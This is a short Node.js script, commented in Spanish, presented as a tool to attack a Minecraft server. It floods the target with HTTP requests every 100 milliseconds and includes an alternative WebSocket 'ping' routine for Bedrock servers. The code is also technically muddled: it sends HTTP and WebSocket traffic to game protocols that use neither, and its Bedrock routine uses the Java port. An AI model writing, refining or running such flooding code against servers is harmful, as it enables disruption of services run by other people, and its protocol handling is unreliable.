const axios = require('axios');
const WebSocket = require('ws');

const targetServer = 'tu_servidor_minecraft.com'; // Cambia esto al servidor que deseas atacar
const port = 25565; // Puerto por defecto para Minecraft Java, 19132 para Bedrock

function stressJavaServer() {
  const interval = setInterval(() => {
    axios.get(`http://${targetServer}:${port}`)
      .catch(err => {
        console.log('Error al conectar al servidor Java:', err);
      });
  }, 100); // Ajusta este intervalo para cambiar la frecuencia de las solicitudes
}

function stressBedrockServer() {
  const ws = new WebSocket(`ws://${targetServer}:${port}`);
  ws.on('open', () => {
    console.log('Conectado al servidor Bedrock');
    ws.send(JSON.stringify({ 'method': 'ping' }));
  });
  ws.on('message', (data) => {
    console.log('Mensaje recibido del servidor Bedrock:', data);
  });
  ws.on('close', () => {
    console.log('Conexión cerrada con el servidor Bedrock');
  });
}

// Elige qué función usar dependiendo del tipo de servidor
stressJavaServer();
// stressBedrockServer();
